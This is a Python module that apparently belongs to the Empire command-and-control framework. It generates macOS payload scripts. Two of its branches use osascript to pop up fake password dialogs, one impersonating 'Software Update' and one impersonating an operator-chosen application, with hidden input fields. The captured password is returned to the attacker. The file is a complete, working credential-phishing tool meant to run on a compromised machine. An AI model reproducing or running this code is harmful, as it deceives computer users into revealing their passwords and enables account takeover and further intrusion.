from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        listApps = params["ListApps"]
        appName = params["AppName"]
        sandboxMode = params["SandboxMode"]
        if listApps != "":
            script = """
import os
apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
choices = []
for x in xrange(len(apps)):
    choices.append("[%s] %s " %(x+1, apps[x]) )

print("\\nAvailable applications:\\n")
print('\\n'.join(choices))
"""

        elif sandboxMode != "":
            # osascript prompt for the current application with System Preferences icon
            script = """
import os
print(os.popen('osascript -e \\\'display dialog "Software Update requires that you type your password to apply changes." & return & return default answer "" with hidden answer with title "Software Update"\\\'').read())
"""

        else:
            # osascript prompt for the specific application
            script = f"""
import os
print(os.popen('osascript -e \\\'tell app "{appName}" to activate\\\' -e \\\'tell app "{appName}" to display dialog "{appName} requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "{appName} Alert"\\\'').read())
"""

        return script
